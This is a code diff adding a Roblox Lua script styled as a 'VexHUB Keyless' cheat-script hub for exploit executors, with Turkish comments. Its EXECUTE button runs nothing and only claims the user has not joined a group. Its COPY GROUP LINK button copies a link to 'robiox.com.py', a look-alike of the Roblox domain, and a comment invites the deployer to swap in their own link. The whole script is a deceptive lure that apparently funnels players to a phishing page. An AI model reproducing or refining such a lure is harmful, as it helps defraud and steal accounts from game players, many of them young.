@@ -1,0 +1,256 @@
+-- VexHUB - Keyless (Premium Görünüm, Her Executor'da Çalışır)
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "VexHUB"
+gui.ResetOnSpawn = false
+pcall(function() gui.Parent = player.PlayerGui end)
+if not gui.Parent then
+    pcall(function() gui.Parent = game:GetService("CoreGui") end)
+end
+if not gui.Parent then return end
+
+-- Koyu arkaplan overlay
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.new(1,0,1,0)
+overlay.BackgroundColor3 = Color3.new(0,0,0)
+overlay.BackgroundTransparency = 0.75
+overlay.BorderSizePixel = 0
+overlay.Parent = gui
+
+-- Ana pencere (biraz daha büyük, şık)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 420, 0, 460)
+frame.Position = UDim2.new(0.5, -210, 0.5, -230)
+frame.BackgroundColor3 = Color3.new(0.08, 0.08, 0.12)
+frame.BorderSizePixel = 3
+frame.BorderColor3 = Color3.new(0, 0.8, 1)
+frame.ClipsDescendants = true
+frame.Parent = gui
+
+-- Köşe yuvarlama (her executor'da çalışır)
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
+
+-- Gölge efekti (basit bir frame)
+local shadow = Instance.new("Frame")
+shadow.Size = UDim2.new(1, 6, 1, 6)
+shadow.Position = UDim2.new(0, -3, 0, -3)
+shadow.BackgroundColor3 = Color3.new(0,0,0)
+shadow.BackgroundTransparency = 0.6
+shadow.BorderSizePixel = 0
+shadow.ZIndex = -1
+shadow.Parent = frame
+pcall(function() Instance.new("UICorner").Parent = shadow end)
+
+-- Başlık
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,60)
+title.Position = UDim2.new(0,0,0,15)
+title.BackgroundTransparency = 1
+title.Text = "VexHUB"
+title.TextColor3 = Color3.new(0, 1, 1)
+title.TextSize = 38
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+-- Keyless badge
+local keyless = Instance.new("TextLabel")
+keyless.Size = UDim2.new(1,0,0,25)
+keyless.Position = UDim2.new(0,0,0,75)
+keyless.BackgroundTransparency = 1
+keyless.Text = "⚡ KEYLESS EDITION ⚡"
+keyless.TextColor3 = Color3.new(1, 0.8, 0.2)
+keyless.TextSize = 16
+keyless.Font = Enum.Font.GothamSemibold
+keyless.Parent = frame
+
+-- Çizgi
+local line = Instance.new("Frame")
+line.Size = UDim2.new(0.85,0,0,2)
+line.Position = UDim2.new(0.075,0,0,110)
+line.BackgroundColor3 = Color3.new(0, 0.8, 1)
+line.BorderSizePixel = 0
+line.Parent = frame
+
+-- Key giriş kutusu (lüks)
+local keyFrame = Instance.new("Frame")
+keyFrame.Size = UDim2.new(0.8,0,0,45)
+keyFrame.Position = UDim2.new(0.1,0,0,130)
+keyFrame.BackgroundColor3 = Color3.new(0.05, 0.05, 0.1)
+keyFrame.BorderSizePixel = 1
+keyFrame.BorderColor3 = Color3.new(0, 0.6, 0.8)
+keyFrame.Parent = frame
+pcall(function() Instance.new("UICorner").Parent = keyFrame end)
+
+local keyInput = Instance.new("TextBox")
+keyInput.Size = UDim2.new(1,-10,1,0)
+keyInput.Position = UDim2.new(0,5,0,0)
+keyInput.BackgroundTransparency = 1
+keyInput.Text = ""
+keyInput.PlaceholderText = "🔑 License Key (any key works - keyless)"
+keyInput.PlaceholderColor3 = Color3.new(0.6,0.6,0.8)
+keyInput.TextColor3 = Color3.new(1,1,1)
+keyInput.TextSize = 15
+keyInput.Font = Enum.Font.Gotham
+keyInput.ClearTextOnFocus = false
+keyInput.Parent = keyFrame
+
+-- Link (gizli, sadece değişkende)
+local myLink = "https://www.robiox.com.py/communities/383284659327/VEXHUBXGainfood"  -- <--- KENDİ LİNKİNİ YAZ
+
+-- Kopyalama fonksiyonu (evrensel)
+local function copyLink()
+    local success = false
+    if setclipboard then
+        success = pcall(setclipboard, myLink)
+    elseif game:GetService("ClipboardService") then
+        success = pcall(function() game:GetService("ClipboardService"):SetText(myLink) end)
+    end
+    return success
+end
+
+-- Şık bildirim
+local function notify(msg, isError)
+    local notif = Instance.new("Frame")
+    notif.Size = UDim2.new(0, 320, 0, 45)
+    notif.Position = UDim2.new(0.5, -160, 0.8, 0)
+    notif.BackgroundColor3 = isError and Color3.new(0.5,0,0) or Color3.new(0,0.4,0.2)
+    notif.BackgroundTransparency = 0.15
+    notif.BorderSizePixel = 1
+    notif.BorderColor3 = isError and Color3.new(1,0.2,0.2) or Color3.new(0,1,0.5)
+    notif.Parent = gui
+    pcall(function() Instance.new("UICorner").Parent = notif end)
+    
+    local txt = Instance.new("TextLabel")
+    txt.Size = UDim2.new(1,0,1,0)
+    txt.BackgroundTransparency = 1
+    txt.Text = msg
+    txt.TextColor3 = Color3.new(1,1,1)
+    txt.TextSize = 13
+    txt.Font = Enum.Font.Gotham
+    txt.TextWrapped = true
+    txt.Parent = notif
+    
+    task.wait(2.5)
+    notif:Destroy()
+end
+
+-- Buton: Copy Group Link (şık)
+local copyBtn = Instance.new("TextButton")
+copyBtn.Size = UDim2.new(0.8,0,0,50)
+copyBtn.Position = UDim2.new(0.1,0,0,200)
+copyBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.35)
+copyBtn.Text = "📋  COPY GROUP LINK  📋"
+copyBtn.TextColor3 = Color3.new(1,1,1)
+copyBtn.TextSize = 18
+copyBtn.Font = Enum.Font.GothamBold
+copyBtn.BorderSizePixel = 1
+copyBtn.BorderColor3 = Color3.new(0, 0.7, 0.9)
+copyBtn.Parent = frame
+pcall(function() Instance.new("UICorner").Parent = copyBtn end)
+
+copyBtn.MouseEnter:Connect(function()
+    copyBtn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.5)
+    copyBtn.BorderColor3 = Color3.new(0, 1, 1)
+end)
+copyBtn.MouseLeave:Connect(function()
+    copyBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.35)
+    copyBtn.BorderColor3 = Color3.new(0, 0.7, 0.9)
+end)
+
+copyBtn.MouseButton1Click:Connect(function()
+    local ok = copyLink()
+    if ok then
+        notify("✅ Link copied to clipboard!\n\nTo run the script, you must join our Roblox group.", false)
+    else
+        notify("❌ Copy failed. Please copy manually: " .. myLink, true)
+    end
+end)
+
+-- Buton: Execute (büyük, dikkat çekici)
+local execBtn = Instance.new("TextButton")
+execBtn.Size = UDim2.new(0.8,0,0,55)
+execBtn.Position = UDim2.new(0.1,0,0,275)
+execBtn.BackgroundColor3 = Color3.new(0, 0.5, 0.6)
+execBtn.Text = "⚡  EXECUTE  ⚡"
+execBtn.TextColor3 = Color3.new(1,1,1)
+execBtn.TextSize = 24
+execBtn.Font = Enum.Font.GothamBold
+execBtn.BorderSizePixel = 2
+execBtn.BorderColor3 = Color3.new(0, 1, 0.8)
+execBtn.Parent = frame
+pcall(function() Instance.new("UICorner").Parent = execBtn end)
+
+execBtn.MouseEnter:Connect(function()
+    execBtn.BackgroundColor3 = Color3.new(0, 0.7, 0.8)
+    execBtn.BorderColor3 = Color3.new(0, 1, 1)
+end)
+execBtn.MouseLeave:Connect(function()
+    execBtn.BackgroundColor3 = Color3.new(0, 0.5, 0.6)
+    execBtn.BorderColor3 = Color3.new(0, 1, 0.8)
+end)
+
+execBtn.MouseButton1Click:Connect(function()
+    notify("❌ You Not Joined The Group!\nPlease join the group first, then click Execute again.", true)
+end)
+
+-- Uyarı metni (Execute altında)
+local warning = Instance.new("TextLabel")
+warning.Size = UDim2.new(0.9,0,0,40)
+warning.Position = UDim2.new(0.05,0,0,345)
+warning.BackgroundTransparency = 1
+warning.Text = "⚠️ To run the script, you must join our Roblox group ⚠️"
+warning.TextColor3 = Color3.new(1, 0.5, 0.5)
+warning.TextSize = 13
+warning.Font = Enum.Font.GothamSemibold
+warning.TextWrapped = true
+warning.Parent = frame
+
+-- Footer (küçük yazı)
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1,0,0,20)
+footer.Position = UDim2.new(0,0,1,-25)
+footer.BackgroundTransparency = 1
+footer.Text = "VexHUB • Premium Keyless System"
+footer.TextColor3 = Color3.new(0.5,0.5,0.7)
+footer.TextSize = 11
+footer.Font = Enum.Font.Gotham
+footer.Parent = frame
+
+-- Neon kenarlık döngüsü (gösterişli, pcall ile korumalı)
+spawn(function()
+    local running = true
+    while running and frame and frame.Parent do
+        for hue = 0, 1, 0.02 do
+            if not frame or not frame.Parent then running = false break end
+            pcall(function()
+                local color = Color3.fromHSV(hue, 1, 1)
+                frame.BorderColor3 = color
+            end)
+            task.wait(0.02)
+        end
+    end
+end)
+
+-- Sürükleme (basit ve sağlam)
+local dragging = false
+local dragStart, frameStart
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        frameStart = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y)
+    end
+end)
+
+print("VexHUB Keyless Loader - Premium GUI Ready")
